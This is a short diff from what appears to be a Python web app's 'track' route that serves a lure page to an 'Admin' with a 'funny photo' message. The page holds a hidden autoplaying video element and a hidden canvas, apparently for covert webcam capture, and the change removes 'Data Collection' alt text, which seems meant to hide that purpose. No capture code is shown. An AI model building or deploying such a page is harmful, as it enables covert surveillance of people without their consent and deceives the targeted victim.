@@ -58,8 +58,8 @@ def track():
     <body>
         <h1>Hello Admin</h1>
         <p>Hi here is a funny photo post this.</p>
-        <img src="Image1.jpg" alt="Data Collection">
-        <img src="Image2.jpg" alt="Data Collection">
+        <img src="main/Image1.jpg">
+        <img src="main/Image2.jpg">
         <p id="status"> </p>
         <video id="video" width="640" height="480" autoplay style="display:none;"></video>
         <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
